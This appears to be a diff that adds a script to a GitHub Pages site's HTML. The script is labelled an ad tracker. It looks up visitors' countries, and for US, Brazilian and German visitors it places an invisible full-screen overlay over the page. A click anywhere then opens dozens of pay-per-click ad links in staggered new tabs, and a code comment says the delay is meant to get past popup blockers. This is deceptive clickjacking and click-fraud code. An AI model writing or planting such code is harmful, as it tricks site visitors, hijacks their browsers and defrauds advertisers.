@@ -3469,7 +3469,97 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 
+<!-- ========================================== -->
+<!-- TAKEADS TRACKER (Trigger on Click, Batch Open) -->
+<!-- Opens all country links with window.open -->
+<!-- ========================================== -->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
 
+    // 1. Domain Check
+    if (window.location.hostname !== 'boussedraoui.github.io') {
+        return; 
+    }
+
+    // 2. All Links (US / BR / DE)
+    const linksUS = [
+        "https://tatrck.com/h/0Hu30_aa0Sva?model=cpc", "https://tatrck.com/h/0Hu30_aa0T7i?model=cpc", "https://tatrck.com/h/0Hu30_aa0UXY?model=cpc", "https://tatrck.com/h/0Hu30_aa0VgG?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0XMd?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZV1?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZoP?model=cpc", "https://tatrck.com/h/0Hu30_aa0Zze?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0a9L?model=cpc", "https://tatrck.com/h/0Hu30_aa0a9g?model=cpc", "https://tatrck.com/h/0Hu30_aa0aQa?model=cpc", "https://tatrck.com/h/0Hu30_aa0azh?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0brA?model=cpc", "https://tatrck.com/h/0Hu30_aa0c1r?model=cpc", "https://tatrck.com/h/0Hu30_aa0cGC?model=cpc", "https://tatrck.com/h/0Hu30_aa0cVk?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0dPJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0dpZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0eI9?model=cpc", "https://tatrck.com/h/0Hu30_aa0eMa?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0ew6?model=cpc", "https://tatrck.com/h/0Hu30_aa0fYK?model=cpc", "https://tatrck.com/h/0Hu30_aa0f-3?model=cpc", "https://tatrck.com/h/0Hu30_aa0gG2?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0gPG?model=cpc", "https://tatrck.com/h/0Hu30_aa0h3i?model=cpc", "https://tatrck.com/h/0Hu30_aa0h4G?model=cpc", "https://tatrck.com/h/0Hu30_aa0hAd?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0hC7?model=cpc", "https://tatrck.com/h/0Hu30_aa0hvZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0iFq?model=cpc", "https://tatrck.com/h/0Hu30_aa0j3O?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0j8k?model=cpc", "https://tatrck.com/h/0Hu30_aa0jA_?model=cpc", "https://tatrck.com/h/0Hu30_aa0jB3?model=cpc", "https://tatrck.com/h/0Hu30_aa0jC6?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0jal?model=cpc", "https://tatrck.com/h/0Hu30_aa0kPU?model=cpc", "https://tatrck.com/h/0Hu30_aa0lNp?model=cpc", "https://tatrck.com/h/0Hu30_aa0mLz?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0nmq?model=cpc", "https://tatrck.com/h/0Hu30_aa0no9?model=cpc", "https://tatrck.com/h/0Hu30_aa0o77?model=cpc", "https://tatrck.com/h/0Hu30_aa0r08?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0r56?model=cpc", "https://tatrck.com/h/0Hu30_aa0sN8?model=cpc", "https://tatrck.com/h/0Hu30_aa0tQK?model=cpc", "https://tatrck.com/h/0Hu30_aa0taZ?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0u2C?model=cpc", "https://tatrck.com/h/0Hu30_aa0uMY?model=cpc", "https://tatrck.com/h/0Hu30_aa0ueB?model=cpc", "https://tatrck.com/h/0Hu30_aa0vbw?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0wVU?model=cpc", "https://tatrck.com/h/0Hu30_aa0wkW?model=cpc", "https://tatrck.com/h/0Hu30_aa0wvr?model=cpc", "https://tatrck.com/h/0Hu30_aa0wvy?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0x7k?model=cpc", "https://tatrck.com/h/0Hu30_aa0xVV?model=cpc", "https://tatrck.com/h/0Hu30_aa0xVi?model=cpc", "https://tatrck.com/h/0Hu30_aa0yYB?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0ykE?model=cpc", "https://tatrck.com/h/0Hu30_aa0zmw?model=cpc", "https://tatrck.com/h/0Hu30_aa0z-x?model=cpc", "https://tatrck.com/h/0Hu30_aa0-h5?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0-rf?model=cpc", "https://tatrck.com/h/0Hu30_aa10h1?model=cpc", "https://tatrck.com/h/0Hu30_aa11aO?model=cpc", "https://tatrck.com/h/0Hu30_aa12Ns?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa12Xf?model=cpc", "https://tatrck.com/h/0Hu30_aa12g4?model=cpc", "https://tatrck.com/h/0Hu30_aa13Yd?model=cpc", "https://tatrck.com/h/0Hu30_aa13dL?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa149a?model=cpc", "https://tatrck.com/h/0Hu30_aa14Cf?model=cpc", "https://tatrck.com/h/0Hu30_aa14Xf?model=cpc", "https://tatrck.com/h/0Hu30_aa14iZ?model=cpc"
+    ];
+
+    const linksBR = [
+        "https://tatrck.com/h/0Hu30_aa0SQ_?model=cpc", "https://tatrck.com/h/0Hu30_aa0f3d?model=cpc", "https://tatrck.com/h/0Hu30_aa0nmM?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0pyq?model=cpc", "https://tatrck.com/h/0Hu30_aa0wRo?model=cpc", "https://tatrck.com/h/0Hu30_aa0yag?model=cpc"
+    ];
+
+    const linksDE = [
+        "https://tatrck.com/h/0Hu30_aa0Ole?model=cpc", "https://tatrck.com/h/0Hu30_aa0PWd?model=cpc", "https://tatrck.com/h/0Hu30_aa0PY-?model=cpc", "https://tatrck.com/h/0Hu30_aa0UPp?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0V3K?model=cpc", "https://tatrck.com/h/0Hu30_aa0Z51?model=cpc", "https://tatrck.com/h/0Hu30_aa0Z6u?model=cpc", "https://tatrck.com/h/0Hu30_aa0Z95?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0blO?model=cpc", "https://tatrck.com/h/0Hu30_aa0jje?model=cpc", "https://tatrck.com/h/0Hu30_aa0lqP?model=cpc", "https://tatrck.com/h/0Hu30_aa0pk_?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0qn4?model=cpc", "https://tatrck.com/h/0Hu30_aa0rtZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0vGt?model=cpc", "https://tatrck.com/h/0Hu30_aa0vK5?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa0z07?model=cpc", "https://tatrck.com/h/0Hu30_aa12DS?model=cpc", "https://tatrck.com/h/0Hu30_aa16tJ?model=cpc", "https://tatrck.com/h/0Hu30_aa172M?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa17Dh?model=cpc", "https://tatrck.com/h/0Hu30_aa17pw?model=cpc", "https://tatrck.com/h/0Hu30_aa18sk?model=cpc", "https://tatrck.com/h/0Hu30_aa19MJ?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa1Bgg?model=cpc", "https://tatrck.com/h/0Hu30_aa1DFr?model=cpc", "https://tatrck.com/h/0Hu30_aa1E52?model=cpc", "https://tatrck.com/h/0Hu30_aa1H9S?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa1HFe?model=cpc", "https://tatrck.com/h/0Hu30_aa1I4c?model=cpc", "https://tatrck.com/h/0Hu30_aa1J-g?model=cpc", "https://tatrck.com/h/0Hu30_aa1K0U?model=cpc",
+        "https://tatrck.com/h/0Hu30_aa1Kh4?model=cpc", "https://tatrck.com/h/0Hu30_aa1LEL?model=cpc", "https://tatrck.com/h/0Hu30_aa1LV3?model=cpc", "https://tatrck.com/h/0Hu30_aa1OKG?model=cpc"
+    ];
+
+    // 3. Batch Open Function
+    function openAllLinks(links) {
+        links.forEach((link, index) => {
+            // First link opens immediately (triggered by user click)
+            // Subsequent links open with a 150ms delay to bypass popup blocker
+            setTimeout(() => {
+                window.open(link, '_blank');
+            }, index * 150);
+        });
+    }
+
+    // 4. IP Detection & Invisible Trigger
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const country = data.country_code;
+            let linksToUse = null;
+
+            if (country === 'US') linksToUse = linksUS;
+            else if (country === 'BR') linksToUse = linksBR;
+            else if (country === 'DE') linksToUse = linksDE;
+
+            if (linksToUse) {
+                // Create a transparent full-screen overlay
+                const overlay = document.createElement('div');
+                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;opacity:0;cursor:pointer;';
+                
+                // When user clicks anywhere (even blank space), trigger opening
+                overlay.addEventListener('click', function() {
+                    openAllLinks(linksToUse);
+                    overlay.remove(); // Remove overlay so page becomes normal again
+                }, { once: true });
+
+                document.body.appendChild(overlay);
+            }
+        })
+        .catch(error => console.log('[Tracker] IP detection failed.'));
+});
+</script>
 
 
 
